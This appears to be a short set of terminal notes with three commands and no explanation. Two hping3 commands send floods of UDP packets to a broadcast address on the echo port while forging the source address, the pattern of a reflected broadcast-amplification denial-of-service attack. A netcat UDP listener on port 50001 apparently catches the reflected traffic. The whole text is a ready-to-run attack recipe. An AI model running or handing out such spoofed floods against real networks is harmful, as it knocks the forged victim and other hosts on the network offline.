sudo hping3 -2 192.168.1.255 -a 192.168.100.2 -p 7 --flood
sudo hping3 -2 192.168.1.255 -a 192.168.100.2 -s 50001 -k -p 7 -d 2 --flood
sudo nc -lu 50001
